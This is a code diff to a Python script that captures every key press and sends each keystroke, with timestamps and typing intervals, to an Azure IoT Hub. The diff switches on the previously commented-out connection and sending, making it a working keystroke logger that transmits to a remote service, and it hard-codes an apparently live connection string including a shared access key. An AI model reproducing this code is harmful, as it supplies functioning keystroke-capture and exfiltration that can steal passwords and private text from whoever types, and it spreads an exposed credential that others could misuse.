@@ -7,7 +7,7 @@ from datetime import datetime
 client = -1
 log_dir = ""
 last_date = time.time()
-CONNECTION_STRING = ""
+CONNECTION_STRING = "HostName=andreiiot.azure-devices.net;DeviceId=keyboard;SharedAccessKey=fS8J0lZo5EgXv81d11lJbiY9E8jz8l49ZbTjArowghc="
 MSG_TXT = '{{"date_and_time": {date_and_time}, "key": {key},"time_between_keys": {time_between_keys}}}'
 
 
@@ -24,12 +24,12 @@ def connection():
 def on_press(key):
     global last_date, client
 
-    #if client == -1:
-    #   connection()
+    if client == -1:
+       connection()
 
     clean_key = str(key).replace("'","")
-    time_between_keys = str(time.time() - last_date)
-    date_and_time = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+    time_between_keys = str("\"") + str(time.time() - last_date) + str("\"")
+    date_and_time = str("\"") + str(datetime.now().strftime("%d/%m/%Y %H:%M:%S")) + str("\"")
 
     #print(clean_key + ' ' + time_between_keys + ' ' + date_and_time)
 
@@ -38,7 +38,7 @@ def on_press(key):
     message = Message(msg_txt_formatted)
 
     print("Sending message: {}".format(message) )
-    #client.send_message(message)
+    client.send_message(message)
     print("Message successfully sent" )
     
     last_date = time.time()
